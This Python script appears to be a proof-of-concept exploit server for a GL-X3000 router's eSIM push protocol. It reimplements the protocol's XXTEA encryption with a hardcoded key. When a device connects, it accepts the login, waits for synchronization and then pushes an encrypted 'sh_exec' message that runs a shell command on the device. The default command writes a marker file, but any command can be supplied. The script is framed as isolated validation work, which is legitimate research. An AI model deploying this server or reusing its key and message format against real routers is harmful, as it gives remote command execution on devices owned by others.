#!/usr/bin/env python3
"""Isolated GL-X3000 eSIM push-protocol server for marker-only validation."""

import argparse
import json
import socket
import struct
import time


KEY = b"j4mX6hn3I8UI6M1eH4YiWUAEIHwjTmbp"
DELTA = 0x9E3779B9


def _u32(value):
    return value & 0xFFFFFFFF


def _words(data, include_length):
    size = (len(data) + 3) // 4
    padded = data.ljust(size * 4, b"\0")
    values = list(struct.unpack("<%dI" % size, padded)) if size else []
    if include_length:
        values.append(len(data))
    return values


def _bytes(values, include_length):
    if not values:
        return b""
    raw = struct.pack("<%dI" % len(values), *values)
    if not include_length:
        return raw
    length = values[-1]
    if length < 0 or length > len(raw) - 4:
        raise ValueError("invalid XXTEA plaintext length")
    return raw[:length]


def xxtea_encrypt(data, key=KEY):
    if not data:
        return b""
    values = _words(data, True)
    key_words = _words(key[:16].ljust(16, b"\0"), False)
    n = len(values) - 1
    rounds = 6 + 52 // (n + 1)
    total = 0
    z = values[n]
    while rounds:
        rounds -= 1
        total = _u32(total + DELTA)
        e = (total >> 2) & 3
        for p in range(n):
            y = values[p + 1]
            mx = _u32(
                (((z >> 5) ^ _u32(y << 2)) + ((y >> 3) ^ _u32(z << 4)))
                ^ ((total ^ y) + (key_words[(p & 3) ^ e] ^ z))
            )
            values[p] = _u32(values[p] + mx)
            z = values[p]
        y = values[0]
        mx = _u32(
            (((z >> 5) ^ _u32(y << 2)) + ((y >> 3) ^ _u32(z << 4)))
            ^ ((total ^ y) + (key_words[(n & 3) ^ e] ^ z))
        )
        values[n] = _u32(values[n] + mx)
        z = values[n]
    return _bytes(values, False)


def xxtea_decrypt(data, key=KEY):
    if not data:
        return b""
    values = _words(data, False)
    key_words = _words(key[:16].ljust(16, b"\0"), False)
    n = len(values) - 1
    rounds = 6 + 52 // (n + 1)
    total = _u32(rounds * DELTA)
    y = values[0]
    while total:
        e = (total >> 2) & 3
        for p in range(n, 0, -1):
            z = values[p - 1]
            mx = _u32(
                (((z >> 5) ^ _u32(y << 2)) + ((y >> 3) ^ _u32(z << 4)))
                ^ ((total ^ y) + (key_words[(p & 3) ^ e] ^ z))
            )
            values[p] = _u32(values[p] - mx)
            y = values[p]
        z = values[n]
        mx = _u32(
            (((z >> 5) ^ _u32(y << 2)) + ((y >> 3) ^ _u32(z << 4)))
            ^ ((total ^ y) + (key_words[e] ^ z))
        )
        values[0] = _u32(values[0] - mx)
        y = values[0]
        total = _u32(total - DELTA)
    return _bytes(values, True)


def recv_exact(conn, size):
    chunks = []
    while size:
        chunk = conn.recv(size)
        if not chunk:
            raise EOFError("peer closed")
        chunks.append(chunk)
        size -= len(chunk)
    return b"".join(chunks)


def recv_frame(conn):
    kind = recv_exact(conn, 1)[0]
    if kind != 5:
        return kind, b""
    size = struct.unpack(">I", recv_exact(conn, 4))[0]
    if size > 1024 * 1024:
        raise ValueError(f"oversized frame: {size}")
    return kind, recv_exact(conn, size)


def send_frame(conn, kind, payload=b""):
    frame = bytes([kind])
    if payload or kind == 5:
        frame += struct.pack(">I", len(payload)) + payload
    conn.sendall(frame)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=1887)
    parser.add_argument(
        "--command",
        default="printf X3000_RCE_CONFIRMED >/tmp/x3000-rce-marker",
    )
    parser.add_argument("--delay", type=float, default=1.0)
    args = parser.parse_args()

    with socket.socket() as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((args.listen, args.port))
        listener.listen(1)
        print(f"LISTEN {args.listen}:{args.port}", flush=True)
        conn, peer = listener.accept()
        with conn:
            conn.settimeout(20)
            print(f"ACCEPT {peer[0]}:{peer[1]}", flush=True)
            kind, encrypted = recv_frame(conn)
            try:
                clear = xxtea_decrypt(encrypted)
            except Exception as exc:
                clear = f"<decrypt-error {exc}>".encode()
            print(f"RX kind={kind} encrypted_len={len(encrypted)} clear={clear!r}", flush=True)
            if kind != 1:
                raise RuntimeError(f"expected login request type 1, received {kind}")

            send_frame(conn, 2)
            print("TX kind=2 login-accepted", flush=True)
            kind, encrypted = recv_frame(conn)
            clear = xxtea_decrypt(encrypted)
            print(f"RX kind={kind} encrypted_len={len(encrypted)} clear={clear!r}", flush=True)
            if b"sync_req" not in clear:
                raise RuntimeError("client did not enter synchronization state")
            time.sleep(args.delay)

            message = json.dumps(
                {"kind": "sh_exec", "tx_id": "friday-marker", "data": args.command},
                separators=(",", ":"),
            ).encode()
            encrypted = xxtea_encrypt(message)
            send_frame(conn, 5, encrypted)
            print(f"TX kind=5 clear={message!r} encrypted_len={len(encrypted)}", flush=True)

            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                try:
                    kind, encrypted = recv_frame(conn)
                except (socket.timeout, EOFError):
                    break
                try:
                    clear = xxtea_decrypt(encrypted)
                except Exception as exc:
                    clear = f"<decrypt-error {exc}>".encode()
                print(
                    f"RX kind={kind} encrypted_len={len(encrypted)} clear={clear!r}",
                    flush=True,
                )
                if b"sh_resp" in clear:
                    break


if __name__ == "__main__":
    main()
